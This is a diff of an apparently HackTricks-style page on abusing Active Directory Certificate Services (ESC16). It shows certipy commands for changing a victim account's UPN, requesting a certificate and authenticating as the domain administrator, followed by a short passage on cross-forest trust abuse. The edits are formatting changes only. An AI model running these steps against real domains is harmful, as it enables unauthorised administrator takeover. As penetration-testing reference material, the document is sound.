-**Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.  
+\*\*Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.
 
 ```bash
 certipy account \
@@ -980,7 +974,7 @@ certipy shadow \
     auto
 ```
 
-**Step 4: Request a certificate as the "victim" user from _any suitable client authentication template_ (e.g., "User") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):
+**Step 4: Request a certificate as the "victim" user from&#x20;**_**any suitable client authentication template**_**&#x20;(e.g., "User") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):
 
 ```bash
 export KRB5CCNAME=victim.ccache
@@ -1011,6 +1005,7 @@ certipy auth \
     -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
     -username 'administrator' -domain 'corp.local'
 ```
+
 ## Compromising Forests with Certificates Explained in Passive Voice
 
 ### Breaking of Forest Trusts by Compromised CAs
@@ -1024,13 +1019,10 @@ Upon authentication across a trust, the **Authenticated Users SID** is added to 
 
 Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.
 
-
 ## References
 
-- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
-- [GhostPack/Certify](https://github.com/GhostPack/Certify)
-- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
+* [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
+* [GhostPack/Certify](https://github.com/GhostPack/Certify)
+* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
 
-{{#include ../../../banners/hacktricks-training.md}}
-
-
+\{{#include ../../../banners/hacktricks-training.md\}}
